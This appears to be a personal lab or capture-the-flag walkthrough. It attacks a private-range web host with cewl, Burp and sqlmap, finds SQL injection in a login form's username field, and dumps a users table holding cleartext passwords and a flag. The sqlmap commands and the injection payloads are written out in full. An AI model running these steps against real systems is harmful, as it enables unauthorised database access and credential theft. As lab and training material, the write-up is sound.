![[Pasted image 20250106165540.png]]

#### cewl
- created a word list with `cewl` because the website is littered with `space` stuff
![[Pasted image 20250106172345.png]]
- cewl
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[06Jan2025 22:12:42]-[/home/kali/SUT/192.168.61.86]
â””â”€# cewl -d 2 -m 5 -w ourWordlist.txt http://192.168.61.86
```
- passwords.txt
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[06Jan2025 22:22:48]-[/home/kali/SUT/192.168.61.86]
â””â”€# tail passwords.txt         
pushes
happen
Thus
physicists
seemed
because
head
start
received
Truly

```
- didnt get anything with a `sniper` attack
![[Pasted image 20250106172500.png]]

#### SQL
- took a `login_post.txt` from the login page
![[Pasted image 20250106172611.png]]
- to begin `sqlmap`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[06Jan2025 22:12:42]-[/home/kali/SUT/192.168.61.86]
â””â”€# ls                                                    
login_post.txt  ourWordlist.txt  passwords.txt

â”Œâ”€â”€(rootðŸ’€gobots)-[06Jan2025 22:25:17]-[/home/kali/SUT/192.168.61.86]
â””â”€# cat login_post.txt 
POST /login.php HTTP/1.1
Host: 192.168.61.86
Content-Length: 28
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.61.86
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.61.86/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=0e711d49658d622328e33eb5cb6f2b98
Connection: keep-alive

username=kaleb&password=test

```

##### SQLmap start
- `mySQL` 5.6
- `Username is vulnerable` to time based and error based and union queries

![[Pasted image 20250106172925.png]]
![[Pasted image 20250106172955.png]]
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[06Jan2025 22:25:21]-[/home/kali/SUT/192.168.61.86]
â””â”€# sqlmap -r login_post.txt --batch --risk=1 --level=3
[22:12:42] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable                                                                    
[22:12:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'                                                                                                                     
[22:12:42] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found                                        
[22:12:42] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNIO
N query injection technique test                                                                                                                                                             
[22:12:42] [INFO] target URL appears to have 3 columns in query                                                                                                                              
[22:12:42] [INFO] POST parameter 'username' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable                                                                                     
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N                                                                                            
sqlmap identified the following injection point(s) with a total of 1142 HTTP(s) requests:                                                                                                    
---                                                                                                                                                                                          
Parameter: username (POST)                                                                                                                                                                   
    Type: error-based                                                                                                                                                                        
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)                                                                                           
    Payload: username=kaleb' AND GTID_SUBSET(CONCAT(0x71706b6a71,(SELECT (ELT(2584=2584,1))),0x7170706b71),2584)-- uWQx&password=test                                                        
                                                                                                                                                                                             
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=kaleb' AND (SELECT 7842 FROM (SELECT(SLEEP(5)))uqeI)-- UBMD&password=test

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: username=-4305' UNION ALL SELECT NULL,CONCAT(0x71706b6a71,0x704f516e414c626667714864794b5a6b664541645267686f71596a46695976705146444e4b786f54,0x7170706b71),NULL-- -&password=test
---
[22:12:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.2.34
back-end DBMS: MySQL >= 5.6
[22:12:42] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.61.86'

[*] ending @ 22:12:42 /2025-01-06/



```
- getting databases
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[06Jan2025 22:25:21]-[/home/kali/SUT/192.168.61.86]                                                                                                                        
â””â”€# sqlmap -r login_post.txt -p username --dbs --batch                                                                                                                                       
```
![[Pasted image 20250106173036.png]]![[Pasted image 20250106173104.png]]
- checking out `starfires` database by dumping the `tables`

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[06Jan2025 22:38:43]-[/home/kali/SUT/192.168.61.86]                                                                                                                        
â””â”€# sqlmap -r login_post.txt -p username -D starfires --tables --batch 
```
![[Pasted image 20250106174620.png]]
- now that we have the `tables` going to identify the `columns`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[06Jan2025 22:40:06]-[/home/kali/SUT/192.168.61.86]
â””â”€# sqlmap -r login_post.txt -p username -D starfires -T users --columns --batch
```

![[Pasted image 20250106174737.png]]
![[Pasted image 20250106174800.png]]
- once we know this is where the credentials are going to dump them

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[06Jan2025 22:40:47]-[/home/kali/SUT/192.168.61.86]                                                                                                                        
â””â”€# sqlmap -r login_post.txt -p username -D starfires -T users --dump --batch           
```
![[Pasted image 20250106175025.png]]![[Pasted image 20250106175052.png]]
- now we have credentials we can login at `http://192.168.61.86/login.php`

```bash
+----+--------------------+----------+
| id | password           | username |
+----+--------------------+----------+
| 1  | hsuiaushdhaksjia99 | kaleb    |
| 2  | sdjsikjdhhdha^21   | admin    |  
+----+--------------------+----------+
```
local.txt
![[Pasted image 20250106175242.png]]
burp showing login
![[Pasted image 20250106175439.png]]
```bash
local.txt - 4c6d250f6aeda0338d8f13366f14cc5b
```